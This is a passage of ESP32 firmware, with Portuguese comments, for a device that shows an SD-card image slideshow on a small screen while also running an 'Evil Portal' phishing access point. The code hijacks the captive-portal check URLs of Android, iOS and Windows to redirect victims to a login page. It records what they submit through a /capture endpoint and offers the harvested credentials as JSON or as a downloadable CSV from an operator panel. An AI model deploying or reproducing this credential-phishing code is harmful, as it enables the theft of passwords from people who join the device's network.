    request->send(200, "text/html; charset=utf-8", loginPage());
  });

  // Captive portal redirect endpoints (Android, iOS, Windows)
  auto portalRedirect = [](AsyncWebServerRequest *request) {
    if (evilPortalActive) {
      request->redirect("http://192.168.4.1/");
    } else {
      request->send(204);
    }
  };
  server.on("/generate_204",          HTTP_GET, portalRedirect);
  server.on("/gen_204",               HTTP_GET, portalRedirect);
  server.on("/connecttest.txt",       HTTP_GET, portalRedirect);
  server.on("/redirect",              HTTP_GET, portalRedirect);
  server.on("/hotspot-detect.html",   HTTP_GET, portalRedirect);
  server.on("/library/test/success.html", HTTP_GET, portalRedirect);
  server.on("/success.txt",           HTTP_GET, portalRedirect);
  server.on("/ncsi.txt",              HTTP_GET, portalRedirect);

  // Captura de credenciais
  server.on("/capture", HTTP_POST, [](AsyncWebServerRequest *request) {
    String ip = request->client()->remoteIP().toString();
    saveCredential(ip, request);
    request->send(200, "text/html; charset=utf-8", captureSuccessPage());
  });

  // Painel
  server.on("/panel", HTTP_GET, [](AsyncWebServerRequest *request) {
    if (!request->hasParam("token")) { request->send(403,"text/plain","Acesso negado"); return; }
    String token = request->getParam("token")->value();
    if (token != cfg_panel_pass) { request->send(403,"text/plain","Senha incorreta"); return; }
    request->send(200, "text/html; charset=utf-8", buildPanelPage(token));
  });

  // API slideshow existente
  server.on("/api/list", HTTP_GET, [](AsyncWebServerRequest *request) {
    if (!isAuthenticated(request)) { request->send(403,"text/plain","Auth fail"); return; }
    request->send(200, "application/json", buildJsonList());
  });

  server.on("/img", HTTP_GET, [](AsyncWebServerRequest *request) {
    if (!isAuthenticated(request)) { request->send(403,"text/plain","Auth fail"); return; }
    if (!request->hasParam("name")) { request->send(400,"text/plain","Missing name"); return; }
    if (xSemaphoreTake(sdMutex, pdMS_TO_TICKS(1000)) != pdTRUE) { request->send(500,"text/plain","SD busy"); return; }
    String name = request->getParam("name")->value();
    String path = String(SLIDES_DIR) + "/" + name;
    if (!SD.exists(path.c_str())) { xSemaphoreGive(sdMutex); request->send(404,"text/plain","Not found"); return; }
    AsyncWebServerResponse *response = request->beginResponse(SD, path, "image/jpeg");
    response->addHeader("Cache-Control","max-age=3600");
    xSemaphoreGive(sdMutex);
    request->send(response);
  });

  server.on("/api/reload", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (!isAuthPost(request)) { request->send(403,"text/plain","Auth fail"); return; }
    ftpDirty = true;
    request->send(200,"text/plain","OK");
  });

  server.on("/api/pause", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (!isAuthPost(request)) { request->send(403,"text/plain","Auth fail"); return; }
    slideshowPaused = !slideshowPaused;
    request->send(200,"text/plain", slideshowPaused ? "paused" : "running");
  });

  server.on("/api/delete", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (!isAuthPost(request)) { request->send(403,"text/plain","Auth fail"); return; }
    if (!request->hasParam("name",true)) { request->send(400,"text/plain","Parametro ausente"); return; }
    deleteImageByName(request->getParam("name",true)->value());
    request->send(200,"text/plain","OK");
  });

  server.on("/api/move", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (!isAuthPost(request)) { request->send(403,"text/plain","Auth fail"); return; }
    if (!request->hasParam("from",true) || !request->hasParam("to",true)) { request->send(400,"text/plain","Parametros ausentes"); return; }
    moveImage(request->getParam("from",true)->value().toInt(), request->getParam("to",true)->value().toInt());
    request->send(200,"text/plain","OK");
  });

  server.on("/api/show", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (!isAuthPost(request)) { request->send(403,"text/plain","Auth fail"); return; }
    if (!request->hasParam("name",true)) { request->send(400,"text/plain","Parametro ausente"); return; }
    forceShowName = request->getParam("name",true)->value();
    forceShowNow  = true;
    request->send(200,"text/plain","OK");
  });

  server.on("/api/config", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (!isAuthPost(request)) { request->send(403,"text/plain","Auth fail"); return; }
    if (request->hasParam("wifi_ssid", true))  cfg_sta_ssid   = request->getParam("wifi_ssid",  true)->value();
    if (request->hasParam("wifi_pass", true))  cfg_sta_pass   = request->getParam("wifi_pass",  true)->value();
    if (request->hasParam("panel_pass",true))  cfg_panel_pass = request->getParam("panel_pass", true)->value();
    if (request->hasParam("ftp_user",  true))  cfg_ftp_user   = request->getParam("ftp_user",   true)->value();
    if (request->hasParam("ftp_pass",  true))  cfg_ftp_pass   = request->getParam("ftp_pass",   true)->value();
    if (request->hasParam("brightness",true)) {
      int b = constrain(request->getParam("brightness",true)->value().toInt(), 1, 255);
      setBrightness((uint8_t)b);
    }
    if (request->hasParam("slide_delay",true))
      cfg_slide_delay = (uint32_t)constrain(request->getParam("slide_delay",true)->value().toInt(), 1000, 30000);
    if (xSemaphoreTake(sdMutex, pdMS_TO_TICKS(3000)) == pdTRUE) { saveConfig(); xSemaphoreGive(sdMutex); }
    request->send(200,"text/plain","Config salva. Clique em reiniciar.");
  });

  server.on("/api/reboot", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (!isAuthPost(request)) { request->send(403,"text/plain","Auth fail"); return; }
    request->send(200,"text/plain","Reiniciando...");
    delay(500);
    ESP.restart();
  });

  // ===== API Evil Portal =====
  server.on("/api/portal", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (!isAuthPost(request)) { request->send(403,"text/plain","Auth fail"); return; }
    evilPortalActive = !evilPortalActive;
    
    // slideshow continua normalmente — evil portal roda em paralelo
    /*
    if (evilPortalActive) {
      slideshowPaused = true;
      drawStatusOverlay("EVIL PORTAL", webAddress);
    } else {
      slideshowPaused = false;
    }
    */
    request->send(200,"text/plain", evilPortalActive ? "active" : "inactive");
  });

  // ===== API Credenciais =====
  server.on("/api/creds", HTTP_GET, [](AsyncWebServerRequest *request) {
    if (!isAuthenticated(request)) { request->send(403,"text/plain","Auth fail"); return; }
    request->send(200, "application/json", buildCredsJson());
  });

  server.on("/api/creds/download", HTTP_GET, [](AsyncWebServerRequest *request) {
    if (!isAuthenticated(request)) { request->send(403,"text/plain","Auth fail"); return; }
    if (xSemaphoreTake(sdMutex, pdMS_TO_TICKS(2000)) != pdTRUE) { request->send(500,"text/plain","SD busy"); return; }
    if (!SD.exists(CREDS_FILE)) {
      xSemaphoreGive(sdMutex);
      request->send(404,"text/plain","Sem credenciais");
      return;
    }
    AsyncWebServerResponse* resp = request->beginResponse(SD, CREDS_FILE, "text/csv");
    resp->addHeader("Content-Disposition", "attachment; filename=\"osep32_creds.csv\"");
    xSemaphoreGive(sdMutex);
    request->send(resp);
  });

  server.on("/api/creds/clear", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (!isAuthPost(request)) { request->send(403,"text/plain","Auth fail"); return; }
    if (xSemaphoreTake(sdMutex, pdMS_TO_TICKS(3000)) == pdTRUE) {
      if (SD.exists(CREDS_FILE)) SD.remove(CREDS_FILE);
      xSemaphoreGive(sdMutex);
    }
    request->send(200,"text/plain","OK");
  });

  server.begin();
}

// ===== Setup =====
void setup() {
  sdMutex = xSemaphoreCreateMutex();
  if (!sdMutex) while(true);

  Serial.begin(115200);

  pinMode(BL_PIN, OUTPUT);
  digitalWrite(BL_PIN, HIGH);
  ledcAttach(BL_PIN, BL_FREQ, BL_RES);

  tft.init();
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);

  TJpgDec.setSwapBytes(true);
  TJpgDec.setCallback(tft_output);

  SPI.begin(18, 19, 23);

  if (!SD.begin(SD_CS)) {
    drawStatusOverlay("SD FAIL");
    while (true) delay(1000);
  }

  loadConfig();
  setBrightness(cfg_brightness);
  startWifi();
  startDns();
  startWeb();
  startFtp();
  loadImagesFromSD();

  drawStatusOverlay("OSEP-32 (SYH2)", webAddress);
  delay(1800);
}

// ===== Loop =====
void loop() {
  dnsServer.processNextRequest();
  ftpSrv.handleFTP();

  if (ftpDirty) {
    ftpDirty = false;
    delay(500);
    loadImagesFromSD();
  }

  static uint32_t lastMs = 0;
  uint32_t now = millis();

  if (forceShowNow) {
    forceShowNow = false;
    drawImageByName(forceShowName);
    for (int i = 0; i < imageCount; i++)
      if (images[i] == forceShowName) { currentIndex = i; break; }
    lastMs = now;
    return;
  }

  //if (!slideshowPaused && !evilPortalActive && now - lastMs >= cfg_slide_delay) {
  if (!slideshowPaused && now - lastMs >= cfg_slide_delay) {
    lastMs = now;
    if (imageCount > 0) {
      drawImageByName(images[currentIndex]);
      currentIndex = (currentIndex + 1) % imageCount;
    } else {
      drawStatusOverlay("Sem imagens", webAddress);
    }
  }
}
